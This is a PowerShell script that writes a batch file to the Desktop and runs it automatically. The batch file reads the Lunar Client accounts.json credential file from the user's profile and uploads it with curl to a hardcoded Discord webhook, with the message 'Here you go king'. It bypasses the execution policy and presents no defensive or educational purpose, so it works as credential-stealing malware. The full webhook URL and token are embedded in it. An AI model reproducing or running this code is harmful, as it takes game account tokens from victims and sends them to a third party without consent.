# Define the path for the batch file
$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$batchFilePath = Join-Path $desktopPath 'send_webhook.bat'

# Define the content of the batch file
$batchContent = @"
@echo off
setlocal enabledelayedexpansion

:: Discord Webhook URL
set "webhookUrl=https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX"

:: Path to the accounts.json file
set "filePath=%USERPROFILE%\.lunarclient\settings\game\accounts.json"

:: Check if the file exists
if not exist "%filePath%" (
    echo File accounts.json does not exist at the specified path.
    pause
    exit /b
)

:: Prepare message
set "message=Here you go king :pray:"

:: Use PowerShell to send the webhook with file attachment
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$hook = '%webhookUrl%';" ^
    "$file = '%filePath%';" ^
    "$msg = '%message%';" ^
    "curl.exe -s -X POST $hook -F 'payload_json={\"content\":\"' + $msg + '\"}' -F 'file=@' + $file;"

if %errorlevel% neq 0 (
    echo Failed to send the webhook request.
) else (
    echo File sent successfully!
)

endlocal
pause
"@

# Write the content to the batch file
Set-Content -Path $batchFilePath -Value $batchContent -Encoding ASCII

# Output a message to confirm creation
Write-Host "Batch file created at $batchFilePath"

# Run the batch file automatically
Start-Process -FilePath $batchFilePath
Write-Host "Batch file is now running..."
